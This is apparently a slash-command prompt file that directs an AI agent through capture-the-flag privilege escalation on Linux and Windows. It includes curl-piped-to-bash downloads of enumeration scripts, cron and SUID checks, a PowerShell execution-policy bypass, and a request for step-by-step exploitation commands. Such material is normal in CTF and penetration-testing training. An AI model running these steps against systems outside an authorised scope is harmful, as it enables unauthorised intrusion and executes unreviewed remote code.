---
description: "Automated privilege escalation enumeration and exploitation"
---

# CTF Privilege Escalation Command

Comprehensive privilege escalation methodology for Linux/Windows targets.

## Linux Privilege Escalation

### 1. Automated Enumeration
Run these scripts:
```bash
# LinPEAS (comprehensive)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

# Pspy (process monitoring)
curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o pspy64
chmod +x pspy64
./pspy64

# Linux Exploit Suggester
curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash
```

### 2. Manual Checks

**SUID Binaries**:
```bash
find / -perm -4000 2>/dev/null
# Check each with GTFOBins: gtfobins.github.io
```

**Capabilities**:
```bash
getcap -r / 2>/dev/null
# Research each capability
```

**Sudo Rights**:
```bash
sudo -l
# Check GTFOBins for sudo exploits
```

**Cron Jobs**:
```bash
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/*
# Look for writable scripts
```

**Writable Paths in PATH**:
```bash
echo $PATH
ls -la /path/to/each/directory
# Check for PATH hijacking opportunities
```

**Services Running as Root**:
```bash
ps aux | grep root
# Check for exploitable services
```

### 3. Kernel Exploits
Search for kernel version exploits:
```bash
uname -a
searchsploit linux kernel $(uname -r)
# Web search: "linux [kernel_version] exploit"
```

### 4. Creative Vectors
- Writable /etc/passwd or /etc/shadow
- Docker/LXC container escape
- NFS no_root_squash
- Weak file permissions on sensitive files
- Exploitable custom binaries

## Windows Privilege Escalation

### 1. Automated Tools
```powershell
# WinPEAS
.\winPEASx64.exe

# PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all
```

### 2. Common Checks
- Unquoted service paths
- Writable service executables
- AlwaysInstallElevated
- Stored credentials
- Scheduled tasks
- Token impersonation (SeImpersonatePrivilege)

## Web Research Integration

For each finding, automatically search:
- "[binary_name] gtfobins"
- "[privilege] windows exploit"
- "[service_name] privesc"
- "[finding] CTF privesc technique"

## Output

Prioritized list of privilege escalation vectors:
1. **High Confidence**: Likely to work, known exploits
2. **Medium**: Requires testing, might work
3. **Low**: Creative approaches, last resort

For each vector, provide:
- Description of the vulnerability
- Step-by-step exploitation commands
- Expected outcome

**Usage**: `/ctf-privesc [linux|windows]`
